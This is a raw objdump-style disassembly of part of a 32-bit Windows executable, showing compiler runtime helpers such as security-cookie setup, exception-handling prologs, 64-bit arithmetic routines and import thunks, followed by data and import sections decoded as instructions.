  409958:	mov    eax,ds:0x40b000
  40995d:	push   esi
  40995e:	push   edi
  40995f:	mov    edi,0xbb40e64e
  409964:	mov    esi,0xffff0000
  409969:	cmp    eax,edi
  40996b:	je     0x40997a
  40996d:	test   esi,eax
  40996f:	je     0x40997a
  409971:	not    eax
  409973:	mov    ds:0x40b004,eax
  409978:	jmp    0x4099e4
  40997a:	lea    eax,[ebp-0xc]
  40997d:	push   eax
  40997e:	call   DWORD PTR ds:0x40e138
  409984:	mov    eax,DWORD PTR [ebp-0x8]
  409987:	xor    eax,DWORD PTR [ebp-0xc]
  40998a:	mov    DWORD PTR [ebp-0x4],eax
  40998d:	call   DWORD PTR ds:0x40e144
  409993:	xor    DWORD PTR [ebp-0x4],eax
  409996:	call   DWORD PTR ds:0x40e13c
  40999c:	xor    DWORD PTR [ebp-0x4],eax
  40999f:	call   DWORD PTR ds:0x40e134
  4099a5:	xor    eax,DWORD PTR [ebp-0x4]
  4099a8:	lea    ecx,[ebp-0x4]
  4099ab:	xor    eax,ecx
  4099ad:	mov    DWORD PTR [ebp-0x4],eax
  4099b0:	lea    eax,[ebp-0x14]
  4099b3:	push   eax
  4099b4:	call   DWORD PTR ds:0x40e148
  4099ba:	mov    eax,DWORD PTR [ebp-0x10]
  4099bd:	xor    eax,DWORD PTR [ebp-0x14]
  4099c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4099c3:	xor    ecx,eax
  4099c5:	cmp    ecx,edi
  4099c7:	je     0x4099d1
  4099c9:	test   DWORD PTR ds:0x40b000,esi
  4099cf:	jne    0x4099d6
  4099d1:	mov    ecx,0xbb40e64f
  4099d6:	mov    DWORD PTR ds:0x40b000,ecx
  4099dc:	not    ecx
  4099de:	mov    DWORD PTR ds:0x40b004,ecx
  4099e4:	pop    edi
  4099e5:	pop    esi
  4099e6:	mov    esp,ebp
  4099e8:	pop    ebp
  4099e9:	ret    
  4099ea:	int3   
  4099eb:	int3   
  4099ec:	int3   
  4099ed:	int3   
  4099ee:	int3   
  4099ef:	int3   
  4099f0:	xor    eax,eax
  4099f2:	ret    
  4099f3:	int3   
  4099f4:	int3   
  4099f5:	int3   
  4099f6:	int3   
  4099f7:	int3   
  4099f8:	push   0x30000
  4099fd:	push   0x10000
  409a02:	call   DWORD PTR ds:0x40e1d4
  409a08:	pop    ecx
  409a09:	pop    ecx
  409a0a:	ret    
  409a0b:	int3   
  409a0c:	int3   
  409a0d:	int3   
  409a0e:	int3   
  409a0f:	int3   
  409a10:	jmp    DWORD PTR ds:0x40e1b0
  409a16:	int3   
  409a17:	int3   
  409a18:	int3   
  409a19:	int3   
  409a1a:	int3   
  409a1b:	int3   
  409a1c:	push   0x409a80
  409a21:	push   DWORD PTR fs:0x0
  409a28:	mov    eax,DWORD PTR [esp+0x10]
  409a2c:	mov    DWORD PTR [esp+0x10],ebp
  409a30:	lea    ebp,[esp+0x10]
  409a34:	sub    esp,eax
  409a36:	push   ebx
  409a37:	push   esi
  409a38:	push   edi
  409a39:	mov    eax,ds:0x40b000
  409a3e:	xor    DWORD PTR [ebp-0x4],eax
  409a41:	xor    eax,ebp
  409a43:	mov    DWORD PTR [ebp-0x1c],eax
  409a46:	push   eax
  409a47:	mov    DWORD PTR [ebp-0x18],esp
  409a4a:	push   DWORD PTR [ebp-0x8]
  409a4d:	mov    eax,DWORD PTR [ebp-0x4]
  409a50:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  409a57:	mov    DWORD PTR [ebp-0x8],eax
  409a5a:	lea    eax,[ebp-0x10]
  409a5d:	mov    fs:0x0,eax
  409a63:	ret    
  409a64:	mov    ecx,DWORD PTR [ebp-0x1c]
  409a67:	xor    ecx,ebp
  409a69:	call   0x409090
  409a6e:	jmp    0x409c0d
  409a73:	int3   
  409a74:	int3   
  409a75:	int3   
  409a76:	int3   
  409a77:	int3   
  409a78:	int3   
  409a79:	int3   
  409a7a:	int3   
  409a7b:	int3   
  409a7c:	int3   
  409a7d:	int3   
  409a7e:	int3   
  409a7f:	int3   
  409a80:	mov    edi,edi
  409a82:	push   ebp
  409a83:	mov    ebp,esp
  409a85:	push   DWORD PTR [ebp+0x14]
  409a88:	push   DWORD PTR [ebp+0x10]
  409a8b:	push   DWORD PTR [ebp+0xc]
  409a8e:	push   DWORD PTR [ebp+0x8]
  409a91:	push   0x409090
  409a96:	push   0x40b000
  409a9b:	call   0x409530
  409aa0:	add    esp,0x18
  409aa3:	pop    ebp
  409aa4:	ret    
  409aa5:	int3   
  409aa6:	int3   
  409aa7:	int3   
  409aa8:	int3   
  409aa9:	int3   
  409aaa:	jmp    DWORD PTR ds:0x40e1b8
  409ab0:	int3   
  409ab1:	int3   
  409ab2:	int3   
  409ab3:	int3   
  409ab4:	int3   
  409ab5:	int3   
  409ab6:	jmp    DWORD PTR ds:0x40e1bc
  409abc:	int3   
  409abd:	int3   
  409abe:	int3   
  409abf:	int3   
  409ac0:	int3   
  409ac1:	int3   
  409ac2:	jmp    DWORD PTR ds:0x40e1c0
  409ac8:	int3   
  409ac9:	int3   
  409aca:	int3   
  409acb:	int3   
  409acc:	int3   
  409acd:	int3   
  409ace:	int3   
  409acf:	int3   
  409ad0:	push   esi
  409ad1:	mov    eax,DWORD PTR [esp+0x14]
  409ad5:	or     eax,eax
  409ad7:	jne    0x409b01
  409ad9:	mov    ecx,DWORD PTR [esp+0x10]
  409add:	mov    eax,DWORD PTR [esp+0xc]
  409ae1:	xor    edx,edx
  409ae3:	div    ecx
  409ae5:	mov    ebx,eax
  409ae7:	mov    eax,DWORD PTR [esp+0x8]
  409aeb:	div    ecx
  409aed:	mov    esi,eax
  409aef:	mov    eax,ebx
  409af1:	mul    DWORD PTR [esp+0x10]
  409af5:	mov    ecx,eax
  409af7:	mov    eax,esi
  409af9:	mul    DWORD PTR [esp+0x10]
  409afd:	add    edx,ecx
  409aff:	jmp    0x409b48
  409b01:	mov    ecx,eax
  409b03:	mov    ebx,DWORD PTR [esp+0x10]
  409b07:	mov    edx,DWORD PTR [esp+0xc]
  409b0b:	mov    eax,DWORD PTR [esp+0x8]
  409b0f:	shr    ecx,1
  409b11:	rcr    ebx,1
  409b13:	shr    edx,1
  409b15:	rcr    eax,1
  409b17:	or     ecx,ecx
  409b19:	jne    0x409b0f
  409b1b:	div    ebx
  409b1d:	mov    esi,eax
  409b1f:	mul    DWORD PTR [esp+0x14]
  409b23:	mov    ecx,eax
  409b25:	mov    eax,DWORD PTR [esp+0x10]
  409b29:	mul    esi
  409b2b:	add    edx,ecx
  409b2d:	jb     0x409b3d
  409b2f:	cmp    edx,DWORD PTR [esp+0xc]
  409b33:	ja     0x409b3d
  409b35:	jb     0x409b46
  409b37:	cmp    eax,DWORD PTR [esp+0x8]
  409b3b:	jbe    0x409b46
  409b3d:	dec    esi
  409b3e:	sub    eax,DWORD PTR [esp+0x10]
  409b42:	sbb    edx,DWORD PTR [esp+0x14]
  409b46:	xor    ebx,ebx
  409b48:	sub    eax,DWORD PTR [esp+0x8]
  409b4c:	sbb    edx,DWORD PTR [esp+0xc]
  409b50:	neg    edx
  409b52:	neg    eax
  409b54:	sbb    edx,0x0
  409b57:	mov    ecx,edx
  409b59:	mov    edx,ebx
  409b5b:	mov    ebx,ecx
  409b5d:	mov    ecx,eax
  409b5f:	mov    eax,esi
  409b61:	pop    esi
  409b62:	ret    0x10
  409b65:	int3   
  409b66:	int3   
  409b67:	int3   
  409b68:	int3   
  409b69:	int3   
  409b6a:	jmp    DWORD PTR ds:0x40e1c8
  409b70:	int3   
  409b71:	int3   
  409b72:	int3   
  409b73:	int3   
  409b74:	int3   
  409b75:	int3   
  409b76:	jmp    DWORD PTR ds:0x40e1cc
  409b7c:	int3   
  409b7d:	int3   
  409b7e:	int3   
  409b7f:	int3   
  409b80:	int3   
  409b81:	int3   
  409b82:	int3   
  409b83:	int3   
  409b84:	int3   
  409b85:	int3   
  409b86:	int3   
  409b87:	int3   
  409b88:	int3   
  409b89:	int3   
  409b8a:	int3   
  409b8b:	int3   
  409b8c:	int3   
  409b8d:	int3   
  409b8e:	int3   
  409b8f:	int3   
  409b90:	ret    
  409b91:	int3   
  409b92:	int3   
  409b93:	int3   
  409b94:	int3   
  409b95:	int3   
  409b96:	int3   
  409b97:	int3   
  409b98:	push   ebx
  409b99:	push   ecx
  409b9a:	mov    ebx,0x40b020
  409b9f:	jmp    0x409bac
  409ba1:	push   ebx
  409ba2:	push   ecx
  409ba3:	mov    ebx,0x40b020
  409ba8:	mov    ecx,DWORD PTR [esp+0xc]
  409bac:	mov    DWORD PTR [ebx+0x8],ecx
  409baf:	mov    DWORD PTR [ebx+0x4],eax
  409bb2:	mov    DWORD PTR [ebx+0xc],ebp
  409bb5:	push   ebp
  409bb6:	push   ecx
  409bb7:	push   eax
  409bb8:	pop    eax
  409bb9:	pop    ecx
  409bba:	pop    ebp
  409bbb:	pop    ecx
  409bbc:	pop    ebx
  409bbd:	ret    0x4
  409bc0:	call   eax
  409bc2:	ret    
  409bc3:	int3   
  409bc4:	int3   
  409bc5:	int3   
  409bc6:	int3   
  409bc7:	int3   
  409bc8:	push   0x409a80
  409bcd:	push   DWORD PTR fs:0x0
  409bd4:	mov    eax,DWORD PTR [esp+0x10]
  409bd8:	mov    DWORD PTR [esp+0x10],ebp
  409bdc:	lea    ebp,[esp+0x10]
  409be0:	sub    esp,eax
  409be2:	push   ebx
  409be3:	push   esi
  409be4:	push   edi
  409be5:	mov    eax,ds:0x40b000
  409bea:	xor    DWORD PTR [ebp-0x4],eax
  409bed:	xor    eax,ebp
  409bef:	push   eax
  409bf0:	mov    DWORD PTR [ebp-0x18],esp
  409bf3:	push   DWORD PTR [ebp-0x8]
  409bf6:	mov    eax,DWORD PTR [ebp-0x4]
  409bf9:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  409c00:	mov    DWORD PTR [ebp-0x8],eax
  409c03:	lea    eax,[ebp-0x10]
  409c06:	mov    fs:0x0,eax
  409c0c:	ret    
  409c0d:	mov    ecx,DWORD PTR [ebp-0x10]
  409c10:	mov    DWORD PTR fs:0x0,ecx
  409c17:	pop    ecx
  409c18:	pop    edi
  409c19:	pop    edi
  409c1a:	pop    esi
  409c1b:	pop    ebx
  409c1c:	mov    esp,ebp
  409c1e:	pop    ebp
  409c1f:	push   ecx
  409c20:	ret    
  409c21:	int3   
  409c22:	int3   
  409c23:	int3   
  409c24:	int3   
  409c25:	int3   
  409c26:	int3   
  409c27:	int3   
  409c28:	int3   
  409c29:	int3   
  409c2a:	int3   
  409c2b:	int3   
  409c2c:	int3   
  409c2d:	int3   
  409c2e:	int3   
  409c2f:	int3   
  409c30:	mov    eax,DWORD PTR [esp+0x8]
  409c34:	mov    ecx,DWORD PTR [esp+0x10]
  409c38:	or     ecx,eax
  409c3a:	mov    ecx,DWORD PTR [esp+0xc]
  409c3e:	jne    0x409c49
  409c40:	mov    eax,DWORD PTR [esp+0x4]
  409c44:	mul    ecx
  409c46:	ret    0x10
  409c49:	push   ebx
  409c4a:	mul    ecx
  409c4c:	mov    ebx,eax
  409c4e:	mov    eax,DWORD PTR [esp+0x8]
  409c52:	mul    DWORD PTR [esp+0x14]
  409c56:	add    ebx,eax
  409c58:	mov    eax,DWORD PTR [esp+0x8]
  409c5c:	mul    ecx
  409c5e:	add    edx,ebx
  409c60:	pop    ebx
  409c61:	ret    0x10
  409c64:	int3   
  409c65:	int3   
  409c66:	int3   
  409c67:	int3   
  409c68:	int3   
  409c69:	int3   
  409c6a:	int3   
  409c6b:	int3   
  409c6c:	int3   
  409c6d:	int3   
  409c6e:	int3   
  409c6f:	int3   
  409c70:	mov    eax,0x40f000
  409c75:	jmp    0x409c7f
  409c7a:	int3   
  409c7b:	int3   
  409c7c:	int3   
  409c7d:	int3   
  409c7e:	int3   
  409c7f:	push   ecx
  409c80:	push   edx
  409c81:	push   eax
  409c82:	push   0x409f94
  409c87:	call   0x408bdb
  409c8c:	pop    edx
  409c8d:	pop    ecx
  409c8e:	jmp    eax
  409c90:	int3   
  409c91:	int3   
  409c92:	int3   
  409c93:	int3   
  409c94:	int3   
  409c95:	int3   
  409c96:	int3   
  409c97:	int3   
  409c98:	int3   
  409c99:	int3   
  409c9a:	int3   
  409c9b:	int3   
  409c9c:	int3   
  409c9d:	int3   
  409c9e:	int3   
  409c9f:	int3   
  409ca0:	mov    eax,0x40f004
  409ca5:	jmp    0x409c7f
  409caa:	int3   
  409cab:	int3   
  409cac:	int3   
  409cad:	int3   
  409cae:	int3   
  409caf:	int3   
  409cb0:	mov    eax,0x40f008
  409cb5:	jmp    0x409c7f
  409cba:	int3   
  409cbb:	int3   
  409cbc:	int3   
  409cbd:	int3   
  409cbe:	int3   
  409cbf:	int3   
  409cc0:	mov    eax,0x40f00c
  409cc5:	jmp    0x409c7f
  409cca:	int3   
  409ccb:	int3   
  409ccc:	int3   
  409ccd:	int3   
  409cce:	int3   
  409ccf:	int3   
  409cd0:	mov    eax,0x40f010
  409cd5:	jmp    0x409c7f
  409cda:	int3   
  409cdb:	int3   
  409cdc:	int3   
  409cdd:	int3   
  409cde:	int3   
  409cdf:	int3   
  409ce0:	mov    eax,0x40f014
  409ce5:	jmp    0x409c7f
  409cea:	int3   
  409ceb:	int3   
  409cec:	int3   
  409ced:	int3   
  409cee:	int3   
  409cef:	int3   
  409cf0:	mov    eax,0x40f018
  409cf5:	jmp    0x409c7f
  409cfa:	int3   
  409cfb:	int3   
  409cfc:	int3   
  409cfd:	int3   
  409cfe:	int3   
  409cff:	int3   
  409d00:	mov    eax,0x40f01c
  409d05:	jmp    0x409c7f
  409d0a:	int3   
  409d0b:	int3   
  409d0c:	int3   
  409d0d:	int3   
  409d0e:	int3   
  409d0f:	int3   
  409d10:	mov    eax,0x40f020
  409d15:	jmp    0x409c7f
  409d1a:	int3   
  409d1b:	int3   
  409d1c:	int3   
  409d1d:	int3   
  409d1e:	int3   
  409d1f:	int3   
  409d20:	mov    eax,0x40f024
  409d25:	jmp    0x409c7f
  409d2a:	int3   
  409d2b:	int3   
  409d2c:	int3   
  409d2d:	int3   
  409d2e:	int3   
  409d2f:	int3   
  409d30:	mov    eax,0x40f028
  409d35:	jmp    0x409c7f
  409d3a:	int3   
  409d3b:	int3   
  409d3c:	int3   
  409d3d:	int3   
  409d3e:	int3   
  409d3f:	int3   
  409d40:	mov    eax,0x40f02c
  409d45:	jmp    0x409c7f
  409d4a:	int3   
  409d4b:	int3   
  409d4c:	int3   
  409d4d:	int3   
  409d4e:	int3   
  409d4f:	int3   
  409d50:	mov    eax,0x40f030
  409d55:	jmp    0x409c7f
  409d5a:	int3   
  409d5b:	int3   
  409d5c:	int3   
  409d5d:	int3   
  409d5e:	int3   
  409d5f:	int3   
  409d60:	mov    eax,0x40f034
  409d65:	jmp    0x409c7f
  409d6a:	int3   
  409d6b:	int3   
  409d6c:	int3   
  409d6d:	int3   
  409d6e:	int3   
  409d6f:	int3   
  409d70:	mov    eax,0x40f038
  409d75:	jmp    0x409c7f
  409d7a:	int3   
  409d7b:	int3   
  409d7c:	int3   
  409d7d:	int3   
  409d7e:	int3   
  409d7f:	int3   
  409d80:	mov    eax,0x40f03c
  409d85:	jmp    0x409c7f
  409d8a:	int3   
  409d8b:	int3   
  409d8c:	int3   
  409d8d:	int3   
  409d8e:	int3   
  409d8f:	int3   
  409d90:	mov    eax,0x40f040
  409d95:	jmp    0x409c7f
  409d9a:	int3   
  409d9b:	int3   
  409d9c:	int3   
  409d9d:	int3   
  409d9e:	int3   
  409d9f:	int3   
  409da0:	mov    eax,0x40f044
  409da5:	jmp    0x409c7f
  409daa:	int3   
  409dab:	int3   
  409dac:	int3   
  409dad:	int3   
  409dae:	int3   
  409daf:	int3   
  409db0:	jmp    DWORD PTR ds:0x40e1e8
  409db6:	int3   
  409db7:	int3   
  409db8:	int3   
  409db9:	int3   
  409dba:	int3   
  409dbb:	int3   
  409dbc:	int3   
  409dbd:	int3   
  409dbe:	int3   
  409dbf:	int3   
  409dc0:	jmp    DWORD PTR ds:0x40e140
  409dc6:	int3   
  409dc7:	int3   
  409dc8:	int3   
  409dc9:	int3   
  409dca:	int3   
  409dcb:	int3   
  409dcc:	int3   
  409dcd:	int3   
  409dce:	int3   
  409dcf:	int3   
  409dd0:	push   ecx
  409dd1:	lea    ecx,[esp+0x4]
  409dd5:	sub    ecx,eax
  409dd7:	sbb    eax,eax
  409dd9:	not    eax
  409ddb:	and    ecx,eax
  409ddd:	mov    eax,esp
  409ddf:	and    eax,0xfffff000
  409de4:	cmp    ecx,eax
  409de6:	jb     0x409df2
  409de8:	mov    eax,ecx
  409dea:	pop    ecx
  409deb:	xchg   esp,eax
  409dec:	mov    eax,DWORD PTR [eax]
  409dee:	mov    DWORD PTR [esp],eax
  409df1:	ret    
  409df2:	sub    eax,0x1000
  409df7:	test   DWORD PTR [eax],eax
  409df9:	jmp    0x409de4
  409dfb:	int3   
  409dfc:	int3   
  409dfd:	int3   
  409dfe:	int3   
  409dff:	int3   
  409e00:	mov    eax,ds:0x40b0a4
  409e05:	cmp    eax,0xffffffff
  409e08:	je     0x409e11
  409e0a:	push   eax
  409e0b:	call   DWORD PTR ds:0x40e120
  409e11:	ret    
  409e12:	int3   
  409e13:	int3   
  409e14:	int3   
  409e15:	int3   
  409e16:	int3   
  409e17:	int3   
  409e18:	int3   
  409e19:	int3   
  409e1a:	int3   
  409e1b:	int3   
  409e1c:	int3   
  409e1d:	int3   
  409e1e:	int3   
  409e1f:	int3   
  409e20:	push   0x40cb60
  409e25:	call   DWORD PTR ds:0x40e11c
  409e2b:	ret    
  409e2c:	int3   
  409e2d:	int3   
  409e2e:	int3   
  409e2f:	int3   
  409e30:	int3   
  409e31:	int3   
  409e32:	int3   
  409e33:	int3   
  409e34:	int3   
  409e35:	int3   
  409e36:	int3   
  409e37:	int3   
  409e38:	int3   
  409e39:	int3   
  409e3a:	int3   
  409e3b:	int3   
  409e3c:	int3   
  409e3d:	int3   
  409e3e:	int3   
  409e3f:	int3   
  409e40:	mov    edi,edi
  409e42:	push   esi
  409e43:	mov    esi,0x400
  409e48:	cmp    DWORD PTR ds:0x40b8c4,esi
  409e4e:	jle    0x409e5c
  409e50:	push   DWORD PTR ds:0x40b8c0
  409e56:	call   DWORD PTR ds:0x40e104
  409e5c:	mov    DWORD PTR ds:0x40b8c4,esi
  409e62:	mov    DWORD PTR ds:0x40b8c0,0x40b8cc
  409e6c:	pop    esi
  409e6d:	ret    
  409e6e:	int3   
  409e6f:	int3   
  409e70:	int3   
  409e71:	int3   
  409e72:	int3   
  409e73:	int3   
  409e74:	int3   
  409e75:	int3   
  409e76:	int3   
  409e77:	int3   
  409e78:	int3   
  409e79:	int3   
  409e7a:	int3   
  409e7b:	int3   
  409e7c:	int3   
  409e7d:	int3   
  409e7e:	int3   
  409e7f:	int3   
  409e80:	mov    edi,edi
  409e82:	push   esi
  409e83:	mov    esi,0x400
  409e88:	cmp    DWORD PTR ds:0x40b0b4,esi
  409e8e:	jle    0x409e9c
  409e90:	push   DWORD PTR ds:0x40b0b0
  409e96:	call   DWORD PTR ds:0x40e104
  409e9c:	mov    DWORD PTR ds:0x40b0b4,esi
  409ea2:	mov    DWORD PTR ds:0x40b0b0,0x40b0bc
  409eac:	pop    esi
  409ead:	ret    
  409eae:	int3   
  409eaf:	int3   
  409eb0:	in     al,0xff
  409eb2:	(bad)  
  409eb3:	inc    DWORD PTR [eax]
  409eb5:	add    BYTE PTR [eax],al
  409eb7:	add    BYTE PTR [eax],bh
  409eb9:	(bad)  
  409eba:	(bad)  
  409ebb:	inc    DWORD PTR [eax]
  409ebd:	add    BYTE PTR [eax],al
  409ebf:	add    dh,bh
  409ec1:	(bad)  
  409ec2:	(bad)  
  409ec3:	push   edx
  409ec5:	cmp    eax,0x3df60040
  409eca:	inc    eax
  409ecb:	add    BYTE PTR [eax],al
  409ecd:	add    BYTE PTR [eax],al
  409ecf:	add    ah,ah
  409ed1:	(bad)  
  409ed2:	(bad)  
  409ed3:	inc    DWORD PTR [eax]
  409ed5:	add    BYTE PTR [eax],al
  409ed7:	add    BYTE PTR [eax+0xffffff],bh
  409edd:	add    BYTE PTR [eax],al
  409edf:	add    dh,bh
  409ee1:	(bad)  
  409ee2:	(bad)  
  409ee3:	push   DWORD PTR [eax-0x21ffbf8a]
  409ee9:	jbe    0x409f2b
  409eeb:	add    BYTE PTR [eax],al
  409eed:	add    BYTE PTR [eax],al
  409eef:	add    dh,bh
  409ef1:	(bad)  
  409ef2:	(bad)  
  409ef3:	inc    DWORD PTR [eax]
  409ef5:	add    BYTE PTR [eax],al
  409ef7:	add    ah,dl
  409ef9:	(bad)  
  409efa:	(bad)  
  409efb:	inc    DWORD PTR [eax]
  409efd:	add    BYTE PTR [eax],al
  409eff:	add    dh,bh
  409f01:	(bad)  
  409f02:	(bad)  
  409f03:	push   DWORD PTR [edi-0x77]
  409f06:	inc    eax
  409f07:	add    BYTE PTR [ebx-0x77],bh
  409f0a:	inc    eax
  409f0b:	add    BYTE PTR [eax],al
  409f0d:	add    BYTE PTR [eax],al
  409f0f:	add    ah,ah
  409f11:	(bad)  
  409f12:	(bad)  
  409f13:	inc    DWORD PTR [eax]
  409f15:	add    BYTE PTR [eax],al
  409f17:	add    BYTE PTR [edi+edi*8+0xffff],al
  409f1e:	add    BYTE PTR [eax],al
  409f20:	(bad)  
  409f21:	(bad)  
  409f22:	(bad)  
  409f23:	call   FWORD PTR [eax+edx*4]
  409f26:	inc    eax
  409f27:	add    BYTE PTR [eax],ah
  409f29:	nop
  409f2a:	inc    eax
  409f2b:	add    dh,bh
  409f2d:	(bad)  
  409f2e:	(bad)  
  409f2f:	call   eax
  409f31:	pop    DWORD PTR [eax+0x0]
  409f34:	in     al,0x8f
  409f36:	inc    eax
  409f37:	add    ah,ah
  409f39:	(bad)  
  409f3a:	(bad)  
  409f3b:	inc    DWORD PTR [eax]
  409f3d:	add    BYTE PTR [eax],al
  409f3f:	add    al,cl
  409f41:	(bad)  
  409f42:	(bad)  
  409f43:	inc    DWORD PTR [eax]
  409f45:	add    BYTE PTR [eax],al
  409f47:	add    dh,bh
  409f49:	(bad)  
  409f4a:	(bad)  
  409f4b:	inc    DWORD PTR [eax]
  409f4d:	add    BYTE PTR [eax],al
  409f4f:	add    BYTE PTR [edx],dh
  409f51:	xchg   ecx,eax
  409f52:	inc    eax
  409f53:	add    BYTE PTR [eax],al
  409f55:	add    BYTE PTR [eax],al
  409f57:	add    dh,bh
  409f59:	(bad)  
  409f5a:	(bad)  
  409f5b:	inc    DWORD PTR [eax]
  409f5d:	add    BYTE PTR [eax],al
  409f5f:	add    ah,dl
  409f61:	(bad)  
  409f62:	(bad)  
  409f63:	inc    DWORD PTR [eax]
  409f65:	add    BYTE PTR [eax],al
  409f67:	add    dh,bh
  409f69:	(bad)  
  409f6a:	(bad)  
  409f6b:	(bad)  
  409f6c:	jl     0x409f05
  409f6e:	inc    eax
  409f6f:	add    BYTE PTR [eax+0x4097],al
  409f75:	add    BYTE PTR [eax],al
  409f77:	add    dh,bh
  409f79:	(bad)  
  409f7a:	(bad)  
  409f7b:	inc    DWORD PTR [eax]
  409f7d:	add    BYTE PTR [eax],al
  409f7f:	add    al,bl
  409f81:	(bad)  
  409f82:	(bad)  
  409f83:	inc    DWORD PTR [eax]
  409f85:	add    BYTE PTR [eax],al
  409f87:	add    dh,bh
  409f89:	(bad)  
  409f8a:	(bad)  
  409f8b:	dec    ebx
  409f8d:	cwde   
  409f8e:	inc    eax
  409f8f:	add    dh,bl
  409f91:	cwde   
  409f92:	inc    eax
  409f93:	add    BYTE PTR [ecx],al
  409f95:	add    BYTE PTR [eax],al
  409f97:	add    al,dl
  409f99:	adc    DWORD PTR [eax],eax
  409f9b:	add    BYTE PTR [esp+eax*8],bl
  409f9e:	add    BYTE PTR [eax],al
  409fa0:	add    al,dh
  409fa2:	add    BYTE PTR [eax],al
  409fa4:	aam    0x9f
  409fa6:	add    BYTE PTR [eax],al
  409fa8:	and    BYTE PTR [eax+0x0],ah
	...
  409fd2:	add    BYTE PTR [eax],al
  409fd4:	mov    BYTE PTR [eax],al
  409fd6:	add    BYTE PTR [eax-0x7fffff10],al
  409fdc:	scas   eax,DWORD PTR es:[edi]
  409fdd:	add    BYTE PTR [eax],al
  409fdf:	or     BYTE PTR [esi+0x0],0x0
  409fe3:	and    ah,0x0
  409fe6:	add    BYTE PTR [eax-0x7fffff73],al
  409fec:	sbb    BYTE PTR [ecx],al
  409fee:	add    BYTE PTR [eax-0x7fffff7d],al
  409ff4:	mov    esi,0x46800000
  409ff9:	add    BYTE PTR [eax],al
  409ffb:	adc    BYTE PTR [eax+eax*1+0xa98000],0x0
  40a003:	add    bh,0x0
  40a006:	add    BYTE PTR [eax-0x7fffff48],al
  40a00c:	lds    eax,FWORD PTR [eax]
  40a00e:	add    BYTE PTR [eax-0x7ffffff8],al
  40a014:	les    eax,FWORD PTR [eax]
  40a016:	add    BYTE PTR [eax-0x7fffffa8],al
	...

Disassembly of section .data:

0040b000 <.data>:
  40b000:	dec    esi
  40b001:	out    0x40,al
  40b003:	mov    ebx,0x44bf19b1
	...
  40b010:	add    DWORD PTR [eax],eax
	...
  40b01e:	add    BYTE PTR [eax],al
  40b020:	and    BYTE PTR ds:0x1993,al
	...
  40b02e:	add    BYTE PTR [eax],al
  40b030:	add    BYTE PTR [ecx],al
  40b032:	add    BYTE PTR [eax],al
  40b034:	loopne 0x40b047
  40b036:	inc    eax
  40b037:	add    bh,bh
  40b039:	(bad)  
  40b03a:	(bad)  
  40b03b:	inc    DWORD PTR [ecx]
  40b03d:	add    BYTE PTR [eax],al
  40b03f:	add    bh,bh
  40b041:	(bad)  
  40b042:	(bad)  
  40b043:	jmp    DWORD PTR [eax]
  40b045:	add    DWORD PTR [eax+0x0],0xffffffb0
  40b049:	add    BYTE PTR [eax+0x0],0x50
  40b04d:	add    BYTE PTR [eax+0x0],0xf0
  40b051:	add    DWORD PTR [eax+0x0],0x408880
  40b058:	and    BYTE PTR [eax-0x783fffc0],cl
  40b05e:	inc    eax
  40b05f:	add    al,dl
  40b061:	test   BYTE PTR [eax+0x0],al
  40b064:	adc    BYTE PTR [ebp-0x792fffc0],al
  40b06a:	inc    eax
  40b06b:	add    BYTE PTR [eax-0x7a],dh
  40b06e:	inc    eax
  40b06f:	add    BYTE PTR [eax],dl
  40b071:	xchg   BYTE PTR [eax+0x0],al
  40b074:	add    BYTE PTR [eax+eax*2+0x0],0x0
  40b07c:	add    BYTE PTR [eax],al
  40b07e:	add    BYTE PTR [eax],al
  40b080:	je     0x40b032
  40b082:	inc    eax
  40b083:	add    BYTE PTR [eax+0x60004084],al
  40b089:	mov    al,0x40
  40b08b:	add    al,dl
  40b08d:	test   BYTE PTR [eax+0x0],al
  40b090:	fs mov al,0x40
  40b093:	add    BYTE PTR [eax],dl
  40b095:	test   DWORD PTR [eax+0x0],eax
	...
  40b0a0:	add    DWORD PTR [ecx],eax
  40b0a2:	add    DWORD PTR [ecx],eax
  40b0a4:	(bad)  
  40b0a5:	(bad)  
  40b0a6:	(bad)  
  40b0a7:	inc    DWORD PTR [eax]
  40b0a9:	add    BYTE PTR [eax],al
  40b0ab:	add    BYTE PTR [eax],al
  40b0ad:	add    BYTE PTR [eax],al
  40b0af:	add    BYTE PTR [eax+esi*4+0x4000040],bh
	...
  40b8ba:	add    BYTE PTR [eax],al
  40b8bc:	test   al,0x20
  40b8be:	inc    eax
  40b8bf:	add    ah,cl
  40b8c1:	mov    eax,0x4000040
	...

Disassembly of section .idata:

0040e000 <.idata>:
  40e000:	test   al,0xe4
  40e002:	add    BYTE PTR [eax],al
  40e004:	mov    esp,0xce0000e4
  40e009:	in     al,0x0
  40e00b:	add    ah,ch
  40e00d:	in     al,0x0
  40e00f:	add    dh,bh
  40e011:	in     al,0x0
  40e013:	add    BYTE PTR [eiz*8-0x1ace0000],bl
  40e01a:	add    BYTE PTR [eax],al
  40e01c:	inc    eax
  40e01d:	in     eax,0x0
  40e01f:	add    BYTE PTR [ebp+eiz*8+0x0],cl
  40e023:	add    BYTE PTR [eax-0x1b],ah
  40e026:	add    BYTE PTR [eax],al
  40e028:	and    ch,0x0
  40e02b:	add    BYTE PTR [ebp+eiz*8-0x1a4c0000],bl
  40e032:	add    BYTE PTR [eax],al
  40e034:	mov    esi,0xdc0000e5
  40e039:	in     eax,0x0
  40e03b:	add    dh,ch
  40e03d:	in     eax,0x0
  40e03f:	add    dh,bh
  40e041:	in     eax,0x0
  40e043:	add    BYTE PTR [edx],bl
  40e045:	out    0x0,al
  40e047:	add    BYTE PTR [esi],ch
  40e049:	out    0x0,al
  40e04b:	add    BYTE PTR [esi+eiz*8+0x0],cl
  40e04f:	add    BYTE PTR [edx-0x1a],ah
  40e052:	add    BYTE PTR [eax],al
  40e054:	jb     0x40e03c
  40e056:	add    BYTE PTR [eax],al
  40e058:	jl     0x40e040
  40e05a:	add    BYTE PTR [eax],al
  40e05c:	mov    esi,fs
  40e05e:	add    BYTE PTR [eax],al
  40e060:	mov    ds:0xc00000e6,al
  40e065:	out    0x0,al
  40e067:	add    al,dl
  40e069:	out    0x0,al
  40e06b:	add    al,ch
  40e06d:	out    0x0,al
  40e06f:	add    BYTE PTR [eax],al
  40e071:	add    BYTE PTR [eax],al
  40e073:	add    BYTE PTR [edi+eiz*8],al
  40e076:	add    BYTE PTR [eax],al
  40e078:	push   ds
  40e079:	out    0x0,eax
  40e07b:	add    BYTE PTR [edi+eiz*8],ch
  40e07e:	add    BYTE PTR [eax],al
  40e080:	ds out 0x0,eax
  40e083:	add    BYTE PTR [eax-0x19],bl
  40e086:	add    BYTE PTR [eax],al
  40e088:	out    0x0,ax
